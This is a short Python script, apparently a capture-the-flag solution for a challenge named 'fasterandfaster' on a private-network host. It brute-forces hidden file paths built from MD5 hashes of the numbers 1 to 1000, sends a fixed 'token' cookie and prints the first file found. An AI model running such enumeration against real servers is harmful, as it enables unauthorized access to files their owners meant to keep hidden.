import requests
import hashlib
url="http://10.136.126.243/00003-fasterandfaster/u/"
l=requests.get("http://10.136.126.243/00003-fasterandfaster/index.php")
print(l.text)
cookies={'token':"hello"}
for i in range(1,1001):
    url = "http://10.136.126.243/00003-fasterandfaster/u/"
    print(i)
    url=url+hashlib.md5(str(i).encode("utf-8")).hexdigest()+".txt"
    r=requests.get(url,cookies=cookies)
    print(url)
    print("status:"+str(r.status_code))
    if(r.status_code==200):
        print(r.text)
        break
